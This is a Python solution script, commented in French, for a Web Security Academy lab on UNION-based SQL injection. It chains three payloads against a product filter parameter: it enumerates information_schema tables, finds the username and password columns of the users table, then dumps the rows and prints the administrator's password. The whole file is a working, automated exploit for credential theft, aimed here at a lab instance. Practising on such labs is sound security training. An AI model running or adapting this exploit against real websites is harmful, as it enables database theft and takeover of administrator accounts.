#Lab: SQL injection attack, listing the database contents on non-Oracle databases

import requests
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def nom_table_user(url):
    url_final=url+"/filter?category=Gifts"
    payload="'UNION SELECT TABLE_NAME,'NULL' FROM information_schema.tables --"
    
    try:
        nom_table_reponse=requests.get(url_final+payload,verify=False)
        soup_nom_table=BeautifulSoup(nom_table_reponse.text,'html.parser').find_all('th')
        user_info=[thligne.get_text() for thligne in soup_nom_table if "users" in thligne.get_text()]
        print(f"Table contenant les infos utilisateurs : {user_info[0]} ")
        return user_info[0]
    except Exception as mon_exception:
        print(f"Erreur : {mon_exception}")
        
def get_user_colomn_name(url):
    u_url_final=url+"/filter?category=Gifts"
    exploit_table=nom_table_user(url)
    u_payload="'UNION SELECT COLUMN_NAME,'NULL' FROM information_schema.columns WHERE table_name = '"+exploit_table+"'--"
    
    try:
        u_reponse=requests.get(u_url_final+u_payload,verify=False)
        u_soup_reponse=BeautifulSoup(u_reponse.text,'html.parser').find_all('th')
        u_username_info=[ uligne.get_text() for uligne in u_soup_reponse if "username" in uligne.get_text()]
        u_password_info=[ uligne.get_text() for uligne in u_soup_reponse if "password" in uligne.get_text()]
        print(f"Colonne contenant les noms d'utilisateurs : {u_username_info[0]}")
        print(f"Colonne contenant les mots de passe : {u_password_info[0]}")
        return u_username_info[0],u_password_info[0],exploit_table
    except Exception as u_exception:
        print(f"Erreur lors de la recuperation du contenu de la table :{u_exception}")
        
        
def lancer_exploit(url):
    exploit_url_final=url+"/filter?category=Gifts"
    user_colonne=get_user_colomn_name(url)
    exploit_payload="'UNION SELECT "+user_colonne[0]+","+user_colonne[1]+" FROM "+user_colonne[2]+" ---"
    
    
    try:
        print("Recuperation des informations de connexion de l'administrateur ...")
        exploit_reponse=requests.get(exploit_url_final+exploit_payload,verify=False)
        soup_exploit_reponse=BeautifulSoup(exploit_reponse.text,'html.parser').find_all('th',string='administrator')
        if soup_exploit_reponse:
            admin_password=soup_exploit_reponse[0].find_next_sibling('td')
            print("Nom d'utilisateur : administrator")
            print(f"Mot de passe : {admin_password.text}")
    except Exception as exploit_exception:
        print(f"Erreur lors du lancement de lexploit : {exploit_exception}")
        
lancer_exploit("https://0a9a004604cb70b5801cda4f006100ab.web-security-academy.net")